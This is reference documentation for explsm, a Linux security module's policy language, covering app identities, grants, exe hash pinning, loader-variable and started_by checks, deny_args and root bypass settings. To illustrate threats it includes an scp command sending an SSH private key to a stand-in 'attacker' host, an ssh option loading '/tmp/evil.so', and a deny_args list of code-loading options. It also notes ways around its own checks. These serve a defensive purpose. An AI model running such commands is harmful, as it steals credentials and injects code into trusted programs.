# The explsm policy language

The policy is every `*.explsm` file in `/etc/explsm/policy.d`, read in name
order, then every one in `/etc/explsm/claims.d` (see
[Answers to prompts](#answers-to-prompts-claimsd)), compiled as one policy:
an app defined in one file can be granted to in another. `explsmctl check`
validates it without loading it, and `explsmctl load` (or
`systemctl reload explsmd`) applies it.

```
# /etc/explsm/policy.d/ssh.explsm
app ssh {
    exe  "/usr/bin/ssh", "/usr/bin/scp", "/usr/bin/ssh-add"
    owns "~/.ssh"
    mode enforce
}

app backup {
    exe "/usr/bin/restic"
}

grant backup read, list to ssh
grant @unconfined list to ssh
```

## Statements

Newlines carry no meaning; `#` starts a comment that runs to the end of the
line. Strings are in double quotes, with `\"` and `\\` as the only escapes.

### `app NAME { … }`

An application: what identifies it (`exe`) and the data it owns (`owns`).

| Line | Meaning |
|---|---|
| `exe "PATH", …` | Executables of the app. A process is the app from the moment it executes one of them, and its children are too until they execute something else. At least one is required. Symlinks are followed. |
| `owns "PATH", …` | Protected roots: the folder (or file) and everything below it belongs to the app. Optional: an app may own nothing and only be granted access to other apps' data. |
| `mode audit` / `mode enforce` | `audit` (the default) allows every access and logs the ones the policy does not allow. `enforce` denies them with `EACCES`. |
| `inherit` | Processes of the app keep its identity when they execute an exe that belongs to no app. See [`inherit`](#inherit). |
| `env "NAME=VALUE", …` | Loader variables the app may be started with. See [`env`](#env-namevalue-). |
| `started_by APP, @terminal, …` | Who may start the app. See [`started_by`](#started_by-app-). |
| `deny_args "ARG", …` | Arguments the app may not be started with. See [`deny_args`](#deny_args-arg-). |
| `code trusted` / `code any` | Which files the app may map as code. See [`code`](#code-trustedany). |

App names are words of letters, digits, `_`, `-` and `.`. `unconfined`,
`all`, `terminal`, `desktop`, `root`, `unknown`, `explsm-agent`, `explsmd` and
`explsm-pins` are reserved. At most 251 different app names can be used until explsm is
unloaded: ids are not reused, because running processes keep theirs, and
they are kept across daemon restarts in `/var/lib/explsm/ids`.

The kernel's maps hold at most 4096 grants (one per subject and owner), 256
`env` strings, 1021 exes, 65536 owned files and folders (with the files that
have more than one hard link inside them) and 256 `terminal`, `shell` and `desktop` exes. The
compiler refuses a policy over a limit it can count (grants, `env` strings,
absolute paths without a glob); what globs and `~/` paths resolve to is
checked when the daemon applies the policy, which then keeps the old one.

An exe that a user other than root could replace (owned by a user, writable
by group or others, or in such a directory) is protected like the app's data:
anyone may run it, only the app may change, move or remove it, and only the
app may add files to its directory, so nothing can be planted for a glob such
as `~/.local/share/claude/versions/*`.

Root-owned exes (`/usr/bin/…`) are trusted as they are: only root can
change them. `explsmctl status` notes each exe as `protected
(user-writable)` or `trusted: only root can change it`.

#### Pinned hashes

An `exe` path may be followed by `sha256 "HEX"` and `hashes "FILE"`, each
any number of times:

```
app claude {
    exe "~/.local/share/claude/versions/*" hashes "/etc/explsm/claude.sha256",
        "/usr/local/bin/tool" sha256 "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
    owns "~/.claude"
}
```

- `sha256` is 64 hex digits, as `sha256sum` prints them.
- `hashes` is an absolute path to a list in `sha256sum` format. Root must
  own it and the directories above it, and they must not be writable by
  group or others, as for [`env`](#env-namevalue-) paths: otherwise the
  policy is refused.
- A file that the path or glob matches but that has none of the hashes is
  refused: it is not the app's exe. explsmd warns `exe PATH of APP has none
  of its pinned hashes; it is no app`, `explsmctl check --resolve` lists it
  as `refused exe PATH (none of its pinned hashes)`, and `explsmctl status`
  adds `, hash pinned` to pinned exes.

This closes trust on first use for a path or glob that matches nothing
yet: whatever appears there first is no app unless it has a listed hash.
The daemon checks the hash when it resolves the path, so a file changed
between the hash and the guard taking hold is a short race. An app that
updates itself needs root to add the hash of each new version; updates are
not checked by signature yet.

`exe "…" script "…"` (interpreter identity, e.g. `node …/cli.js`) is
reserved and reported as not supported yet.

#### `inherit`

Some apps are more than one exe: an AppImage mounts itself at a new
`/tmp/.mount_*` path every time it starts and runs a shell script from
there, which runs the real program; a launcher runs a runtime through a
Python script, and the runtime runs the program it was given. None of
those exes can be named in `exe`, and without `inherit` each of them is a
process that is no app.

With `inherit`, a process of the app that executes an exe that belongs to no
app keeps the app's identity, and so do its children. An exe of another app
still makes the process that app. Name the exe the app is started by (the
AppImage, say) and the folders all of them use:

```
app launcher {
    exe  "/opt/launcher/Launcher.AppImage"
    inherit                  # its bundled programs, the games
    owns "~/.local/share/launcher", "/srv/games"
}
```

When a process keeps the identity this way, its loader variables and user
namespace are not checked (see [Loader variables](#loader-variables)): the
app chose them itself. Everything the app runs is the app, though, including a browser it starts
to open a link, so `inherit` is for apps whose helpers are trusted as much
as the app.

A process that was already running when the policy was loaded is only
given the identity if its own exe is the app's. Restart the app after the
first load.

#### `env "NAME=VALUE", …`

An app exe executed with `LD_PRELOAD`, `LD_LIBRARY_PATH` or `LD_AUDIT` set
runs as no app, because the loader would run code of the caller's choice
with the app's identity. `env` lists exact strings that don't drop it, e.g.
for a launcher that a desktop entry starts with a library preloaded:

```
env "LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libxkbcommon.so.0"
```

- Only those three variables, which are the only ones looked at, may be
  named. The string must match exactly, including the order of its entries,
  and be at most 126 bytes long.
- Each entry (separated by `:`, `;` or spaces) must be an absolute path,
  without `$ORIGIN` and the like. Root must own it and the directories above
  it, and they must not be writable by group or others: otherwise loading
  the policy fails, since a user could put their own library there.
- Any other loader variable next to an allowed one still drops the identity.

#### `started_by APP, …`

Malware need not get into an app; it can run the real one with its own
arguments (`scp ~/.ssh/id_ed25519 attacker:`). `started_by` lists who may
start the app, in any mix:

- an app: a process of that app;
- `@terminal`: a process in a chain of shells started by a terminal (see
  [`shell`](#shell-path-)), i.e. a command typed in a terminal;
- `@desktop`: the desktop shell (see [`desktop`](#desktop-path-)), i.e.
  the app was started from a menu or dock;
- `@unconfined`: anyone. A warning, since it checks nothing.

```
terminal "/usr/bin/ptyxis"
shell    "/usr/bin/bash", "/usr/bin/zsh"

app ssh {
    exe  "/usr/bin/ssh", "/usr/bin/scp"
    started_by @terminal, git
    mode enforce
}
```

At exec, the process gets the app's identity only if what it was just
before the exec matches: the app it was, or the app of the process that
forked it. That is recorded in task storage at fork, so a process
re-parented to `systemd --user` keeps what started it. Otherwise it runs as
no app, and is never given the identity later, at startup or when exes are
added. In enforce mode it is dropped; in audit mode it is only reported and
keeps the identity:

```
deny   pid=4245 … app=ssh exe=/usr/bin/scp dropped=started_by spawner=unconfined
```

`spawner` is the app (or `unconfined`), with `(terminal)` or `(desktop)`
after it when the process had that flag. An exec that keeps the identity
(an app's process executing the app's exe again) is not checked.

- Naming the app itself, or an unknown `@…`, is an error.
- Naming an app whose exe is a launcher that starts programs for anyone
  (`systemd`, `systemd-run`, `dbus-daemon`, `dbus-broker`, `gnome-session`,
  `gnome-session-binary`, `gnome-terminal-server`, `xdg-open`, `gio`,
  `gio-launch-desktop`) is a warning.
- `@terminal` without any `terminal` exe or without any `shell` exe is a
  warning, and so is `@desktop` without a `desktop` exe.

What it doesn't do:

- A wrapper between the shell and the app (`env`, `sudo`, `nice`, `time`)
  ends the chain of shells, unless it is listed as a `shell`.
- `@terminal` stops background malware, not a script the user ran in that
  terminal. An `npm install` postinstall script is cut off, because `node`
  is no shell; `bash evil.sh` typed by the user is a shell.
- Processes running when explsmd starts are not in a chain of shells (only
  the terminal flag is given to them). Open a new shell.
- `gnome-terminal-server` opens a terminal for any caller, like any
  terminal emulator started with a command (see
  [`terminal`](#terminal-path-)).

#### `deny_args "ARG", …`

Arguments that drop the identity: an argument equal to a pattern, or
starting with a pattern that ends in `*`. Each argument of the exec is
compared on its own. Enforce and audit mode as for `started_by`; logged as
`dropped=deny_args`.

```
app ssh {
    exe "/usr/bin/ssh", "/usr/bin/scp"
    deny_args "-I", "-F", "-oPKCS11Provider*", "PKCS11Provider*"
}
```

- `*` is only allowed at the end; there are no other globs.
- At most 126 bytes a pattern, and 256 patterns in all apps.

This is a backstop, and easy to get around: another spelling (case,
`-o PKCS11Provider=…` as two arguments, which is why `PKCS11Provider*` is
listed for the second word), or a config file (`-F`, `~/.ssh/config`). Use
it only for known options that load code or redirect the app.

#### `code trusted|any`

`code trusted` (the default): a process of the app may map a file as code
(`mmap` or `mprotect` with `PROT_EXEC`) only if root alone can change the
file, or the file belongs to the app (its exe or its owned data). Root
alone can change a file owned by uid 0, not writable by group or others,
and not on FUSE (where the mounter decides the owner). Only the file itself
is checked, not the directories above it. Anonymous executable memory (JITs)
is left alone. In enforce mode the map fails with `EACCES`; in audit mode it
is reported:

```
deny   … subject=coder owner=unconfined mmap need=code /var/tmp/x/user.so
```

This stops `ssh -o PKCS11Provider=/tmp/evil.so` (and `SecurityKeyProvider`),
and Python or Node native modules from a user-writable path. It also backs
up the `LD_PRELOAD` check. `code any` turns it off, for apps that load
plugins from the user's folders.

`explsmctl status` and `check` show `code any`, `started_by …` and
`deny_args …` for each app that has them.

#### Loader variables

An exec that gives a process an app's identity (from no app, or from another
app) is refused the identity if a loader variable is set that the app's
`env` does not allow, or if the process is in a user namespace other than
the initial one.

An exec that keeps the identity is not checked: a process of an app that
executes one of the app's own exes again, with or without `inherit`, or a
process of an `inherit` app that executes an exe of no app. The app chose
the environment and the namespace itself. Chromium-based browsers and
Electron apps need this: they start their sandboxed zygote by executing
their own exe again in a user namespace they just created.

### `grant SUBJECT PERMS to OWNER`

Lets `SUBJECT` access the data of `OWNER`. Grants for the same pair add up.

- **SUBJECT**: an app, `@unconfined` (every process that is no app),
  `@root` (every process with fsuid 0 that is no app; it has the
  `@unconfined` grants too) or `@terminal` (see
  [`terminal`](#terminal-path-)). A root process of an app (a daemon named
  by `exe`) has its app's grants only. `@root` grants matter where the
  root bypass does not let root through anyway (see
  [`root_bypass`](#root_bypass-onoffaudit)); with `root_bypass audit`, what
  they cover is no longer logged as a `bypass`.
- **PERMS**: comma-separated, from `read`, `write`, `create`, `delete`,
  `rename`, `list` (read a directory), `setattr` (mode, owner, times,
  xattrs, ACLs), or `all`. Truncation counts as `write`.
- **OWNER**: an app, `*` for every app's data, `@explsm` for explsm's
  own files (see below), or `@launch` for the files that start programs
  (see [`launch_files`](#launch_files-offauditenforce)).

An app always has full access to its own data; granting it to itself is an
error.

`@explsm` is explsm's own files: the policy and claims directories,
`/var/lib/explsm`, explsm's binaries, unit files and bus policy. Anyone may
read them; only explsmd changes them, and root while the root bypass is `on`
or `audit`. With `root_bypass off`, a grant to `@explsm` lets an app change
them, so that package upgrades work:

```
# /usr/share/doc/explsm/examples/dpkg.explsm
app dpkg { exe "/usr/bin/dpkg" }
grant dpkg write, create, delete, rename, setattr to @explsm
```

Only an app can be granted `@explsm` (not `@unconfined`, `@root` or
`@terminal`), and `*` grants don't cover it. Such a grant is a grant to
everything the app runs as: for dpkg, every package root installs. The
pin directory can't be granted to anyone. With that grant, explsm's
`prerm` keeps explsm loaded across an upgrade with `root_bypass off`, as it
does with the bypass.

Moving data between owners can't be granted: a rename or hard link whose
source and destination have different owners fails with `EXDEV`, so `mv`
copies and deletes instead, and each step is checked.

### `terminal "PATH", …`

Terminal entry exes: terminal emulators, `sshd`, `login`. A process started
below one of them, with no app exec in between, is a terminal process. While
it has a controlling tty it gets the `@terminal` grants on top of the
`@unconfined` ones, so you can read your own data by hand:

```
terminal "/usr/bin/ptyxis", "/usr/bin/konsole", "/usr/sbin/sshd"
grant @terminal read, list to ssh
```

This holds for root too: a root shell on a tty or over ssh (a `login` or
`sshd` listed here, or `sudo -i` / `su` in a user's terminal, which keep the
flag) is `@root` plus the `@terminal` grants, so an admin can look at data
on purpose with `root_bypass off`. explsm's log lines of processes with
fsuid 0 carry the audit `loginuid` and `sessionid` (`unset` for services),
so such an access is logged with who logged in.

List the process that starts the shells: for GNOME Terminal that is
`/usr/libexec/gnome-terminal-server`, not the `gnome-terminal` command. A
`@terminal` grant without any `terminal` exe is a warning.

**This is a heuristic, not a boundary.** Any program of the user can start a
terminal emulator with a command of its choice (`konsole -e cat …`). Prefer
prompts or app grants for sensitive data. Processes that were running below a
terminal when the daemon started get the flag too. A terminal removed from
the policy keeps its running processes trusted until they exit.

### `shell "PATH", …`

Shells: `/usr/bin/bash`, `/usr/bin/zsh`. A `terminal` exe starts a chain of
shells; an exec of a `shell` exe keeps it, an exec of anything else ends it.
`started_by @terminal` checks for it:

```
terminal "/usr/bin/ptyxis"
shell    "/usr/bin/bash", "/usr/bin/zsh", "/usr/bin/fish"
```

### `desktop "PATH", …`

The desktop shell, e.g. `/usr/bin/gnome-shell`. Its processes are the
desktop until their next exec, so a program it starts from a menu or dock
is `started_by @desktop`.

`terminal`, `shell` and `desktop` exes share one map of 256.

### `claim APP "PATH", …`

More roots of an app defined elsewhere. The daemon writes these for
auto-claims; they can be written by hand too.

### `root_bypass on|off|audit`

What a process with fsuid 0 gets past. Label changes and `EXDEV` are never
bypassed, nor the pin directory.

- `audit` (the default): root gets through every other check, and every
  access that only the bypass let through is logged as a `bypass` line
  (`EXPLSM_ACTION=bypass`), with what it would have needed. Run like this
  for a while, then turn the log into grants with `explsmctl learn @root`
  and switch to `off`.
- `on`: the same, silently (the default before audit mode).
- `off`: root is checked like any other process: a root process that is no
  app is `@root` and has the `@root` and `@unconfined` grants (and
  `@terminal` ones on a terminal), a root process of an app has its app's.
  It can't change explsm's own files either (except as an app granted
  `@explsm`), nor ptrace or core-dump an app's processes.

`explsmd --no-root-bypass` turns it off regardless.

### `fail_closed on|off`

`off` (the default): if explsmd fails to start at boot, users log in
unprotected; their explsm-agent tells them explsm is not running, at login
and whenever explsmd leaves the bus. `on`: no user may log in until explsmd
is running. explsmd notes this in `/var/lib/explsm/fail-closed` once the
policy is in force, and at the next boot `explsm-gate.service` (required by
`systemd-user-sessions.service`) fails if explsmd is not active, which
keeps `/run/nologin`: only root may log in. Fix explsmd, then `systemctl
start systemd-user-sessions`; or boot with `explsm=off`, which skips the
gate. It takes effect at the next boot, and stays as the last policy in
force left it. Turn it off before disabling explsmd.

### `launch_files off|audit|enforce`

The files a user's shell, desktop session and service manager start
programs from belong to explsm's `@launch` owner: `~/.bashrc`,
`~/.bash_profile`, `~/.profile`, `~/.bash_login`, `~/.zshrc`,
`~/.config/fish`, `~/.config/autostart`, `~/.config/systemd/user` and
`~/.local/share/applications` (a `.desktop` file there overrides the
system one of the same name). A program that writes one of them makes
the user's own shell or desktop run its command, which `started_by` would
then trust.

Anyone may read them. Changing, creating in, removing or renaming them
needs a grant to `@launch`, for the desktop's settings and the editor you
edit them with:

```
launch_files enforce
app editor { exe "/usr/bin/gnome-text-editor" }
grant editor all to @launch
```

`audit` (the default) only reports the changes, so a policy can be learnt
first; `enforce` refuses them; `off` leaves the files alone. `*` grants
cover `@launch` too. Files that don't exist are protected once they appear
and the daemon resolves the paths again; renaming a folder above one (say
`~/.config`) is not refused.

### `require_sandbox on|off`

`off` (the default): if explsmd can't put itself in its Landlock sandbox
(a kernel without Landlock, or `landlock` missing from its `lsm=` list), it
says so and runs anyway. `on`: it refuses to start instead, before loading
anything when the kernel has no Landlock at all; a kernel with only some of
Landlock's rights is enough. Read at start only. With `fail_closed off`, a
refused start leaves users unprotected rather than protected by an
unsandboxed daemon, so turn both on, or neither.

### `require_dbus on|off`

`off` (the default): without the system bus explsmd still enforces the
policy, but no prompts reach the agents and `explsmctl status`, `load` and
`unload` don't work (SIGHUP still reloads). `on`: it refuses to start
instead. Read at start only. Either way systemd learns at once whether the
start worked (`Type=notify`), so a failed start is restarted (up to 5 times
a minute) instead of holding up logins until a timeout.

### `users NAME_OR_UID, …`

The users `~/` paths are expanded for. Without it: every user in
`/etc/passwd` with `UID_MIN ≤ uid ≤ UID_MAX` (from `/etc/login.defs`,
default 1000–60000) whose home is a directory. Users given here are used
whatever their uid; unknown ones are a warning.

## Paths

- Absolute (`/srv/data`), or relative to each user's home (`~/.ssh`).
  `~` alone and `/` can't be owned; `.` and `..` components are not allowed.
- The **last component may be a glob** (`*`, `?`, `[…]`), e.g.
  `exe "~/.local/share/claude/versions/*"`. Directories matching an `exe`
  glob are skipped.
- A path that does not exist (yet) is a warning, not an error: with `~`
  expanded for every user, most users won't have most folders.

## Resolution and updates

The daemon turns every path into an inode and enforces on inodes. It watches
the directory of each path, and resolves the policy again (after 500 ms of
quiet) when a matching entry appears, disappears or is replaced:

- **Package updates** that rename a new binary over the old one: the new
  inode becomes the app's exe and the old one is dropped. Processes already
  running the old binary keep their identity.
- **Folders created later** (`~/.claude` after the first run of Claude):
  protected as soon as they appear. What happens in them before the rescan
  (well under a second) is not checked.
- **Roots moved away from their path** stay protected under their inode, as
  long as they exist and the policy still names the path. `explsmctl status`
  shows where they went. After a daemon restart only paths count again; the
  `security.bpf.explsm` label still marks the moved folder.
- **`/etc/passwd`** changes: `~` is expanded again for the new user list.
- **A root that is a file** and is saved by writing a temporary file and
  renaming it over the old one (as many programs do) gets a new inode each
  time. The new file is protected again after the rescan, but the temporary
  file, which sits in the unprotected parent folder, never is. Prefer
  folders as roots.

Edits to the policy files are not applied by themselves; the daemon logs
that the policy changed and waits for `explsmctl load` or SIGHUP. A policy
with errors is refused and the old one stays in force.

One inode claimed as an exe (or a root) by two apps is an error. A root
inside another app's root is allowed; the innermost root owns its tree.

## Answers to prompts (`claims.d`)

The daemon writes the answers that change the policy to
`/etc/explsm/claims.d/<user>.explsm` and reloads it (see the README for the
agent):

```
# allowed by alice through a prompt
app rg { exe "/usr/bin/rg" }
grant rg read, list to ssh

# claimed by alice through a prompt
claim claude "/home/alice/.claude-cache"
```

- "Always allow" for an app adds a `grant`. For an unconfined process it adds
  an app for its exe (named after the file, with a number added if the name
  is taken) and a grant to it. That process is no longer `@unconfined`, so
  `@unconfined` and `@terminal` grants stop applying to it.
- Saying yes to a new folder adds a `claim`, with the full path, for that
  user only.
- Grants are not per user: a grant written for one user applies to the data
  of every user.
- If the policy does not load with the new lines, they are taken back and
  the old policy stays in force.

In these files, a statement that names an app that no longer exists is a
warning and is skipped, so removing an app from `policy.d` does not break the
policy. Everything else is checked as in `policy.d`. The files may be edited
or deleted by hand; `explsmctl load` applies the change.

## Errors

Diagnostics point at the file, line and column:

```
Error: unknown permission `exec`
   ╭─[ /etc/explsm/policy.d/ssh.explsm:7:25 ]
   │
 7 │ grant @unconfined read, exec to ssh
   │                         ──┬─
   │                           ╰─── unknown permission `exec`
   │
   │ Note: permissions are read, write, create, delete, rename, list, setattr, or `all`
───╯
```
